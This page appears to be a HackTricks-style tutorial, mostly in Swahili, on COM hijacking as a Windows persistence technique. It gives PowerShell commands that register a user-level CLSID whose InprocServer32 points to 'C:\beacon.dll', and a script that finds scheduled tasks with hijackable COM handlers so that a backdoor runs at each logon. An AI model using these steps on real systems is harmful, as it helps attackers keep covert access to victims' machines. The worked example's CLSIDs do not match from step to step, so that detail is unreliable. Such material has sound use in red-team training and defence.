# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Kutafuta sehemu za COM zisizopo

Kwa kuwa thamani za HKCU zinaweza kubadilishwa na watumiaji, **COM Hijacking** inaweza kutumika kama **mekanismu ya kudumu**. Kwa kutumia `procmon` ni rahisi kupata rejista za COM zilizotafutwa ambazo hazipo ambazo mshambuliaji anaweza kuunda ili kudumu. Filters:

- **RegOpenKey** operations.
- ambapo _Result_ ni **NAME NOT FOUND**.
- na _Path_ inaishia na **InprocServer32**.

Mara tu unapokuwa umekamua ni COM ipi isiyopo ya kuiga, tekeleza amri zifuatazo. _Kuwa makini ikiwa utaamua kuiga COM ambayo inaloadi kila sekunde chache kwani hiyo inaweza kuwa kupita kiasi._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Vipengele vya COM vya Task Scheduler vinavyoweza kutekwa

Windows Tasks hutumia Custom Triggers kuita vitu vya COM na kwa sababu vinatekelezwa kupitia Task Scheduler, ni rahisi kutabiri wakati vitakavyotolewa.

<pre class="language-powershell"><code class="lang-powershell"># Onyesha CLSIDs za COM
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Jina la Kazi: " $Task.TaskName
Write-Host "Njia ya Kazi: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Mfano wa Matokeo:
<strong># Jina la Kazi:  Mfano
</strong># Njia ya Kazi:  \Microsoft\Windows\Mfano\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [zaidi kama ile ya awali...]</code></pre>

Ukikagua matokeo unaweza kuchagua moja ambalo litatekelezwa **kila wakati mtumiaji anapoingia** kwa mfano.

Sasa kutafuta CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** katika **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** na katika HKLM na HKCU, kwa kawaida utaona kwamba thamani hiyo haipo katika HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Kisha, unaweza tu kuunda kiingilio cha HKCU na kila wakati mtumiaji anapoingia, nyuma yako itawashwa. 

{{#include ../../banners/hacktricks-training.md}}
